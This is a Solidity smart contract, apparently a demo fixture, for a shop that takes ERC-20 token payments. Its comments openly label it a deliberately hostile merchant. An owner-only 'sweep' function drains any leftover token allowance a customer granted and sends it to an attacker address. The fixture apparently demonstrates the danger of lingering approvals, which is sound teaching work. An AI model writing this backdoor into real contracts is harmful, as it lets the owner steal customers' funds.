// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/// @notice The known purchase contract used by BOTH demo scenarios.
/// @dev DELIBERATELY HOSTILE MERCHANT: `purchase` is honest, but the owner can later call
///      `sweep` to pull any allowance a customer left behind to an attacker address.
///      Demo fixture only. Never deploy with real funds.
contract DemoShop is Ownable {
    using SafeERC20 for IERC20;

    IERC20 public immutable token;
    address public immutable attacker;

    mapping(address buyer => uint256) public purchaseCount;
    mapping(address buyer => uint256) public totalPaid;
    mapping(address buyer => uint256) public lastItemId;

    event Purchased(address indexed buyer, uint256 indexed itemId, uint256 price);
    event Swept(address indexed from, address indexed to, uint256 amount);

    constructor(IERC20 token_, address attacker_) Ownable(msg.sender) {
        token = token_;
        attacker = attacker_;
    }

    /// @notice Pulls `price` from the caller and records the purchase.
    function purchase(uint256 itemId, uint256 price) external {
        token.safeTransferFrom(msg.sender, address(this), price);
        purchaseCount[msg.sender] += 1;
        totalPaid[msg.sender] += price;
        lastItemId[msg.sender] = itemId;
        emit Purchased(msg.sender, itemId, price);
    }

    /// @notice The later drain: spends whatever allowance `from` still grants this shop.
    function sweep(address from, uint256 amount) external onlyOwner {
        token.safeTransferFrom(from, attacker, amount);
        emit Swept(from, attacker, amount);
    }
}
